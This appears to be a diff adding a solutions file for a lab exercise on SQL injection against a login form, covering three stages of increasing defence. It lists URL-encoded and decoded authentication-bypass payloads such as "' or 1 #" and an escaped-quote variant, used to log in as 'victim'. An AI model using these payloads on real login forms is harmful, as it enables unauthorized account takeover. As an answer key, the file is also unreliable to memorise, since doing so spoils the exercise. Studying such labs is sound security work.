@@ -1,0 +1,17 @@
+1.1 No Defenses:
+    Solution: username=victim&password=%27%20or%201%20%23
+
+    username field: victim 
+    password field: 'or 1 #
+
+1.2 Simple Escaping
+    Solution: username=victim&password=%5C%27%27%20or%201%20%23
+
+    username: victim 
+    password : \' or 1 #
+
+1.3 Escaping and Hashing
+    Solution: username=victim&password=227498
+
+    username: victim
+    password: 227498
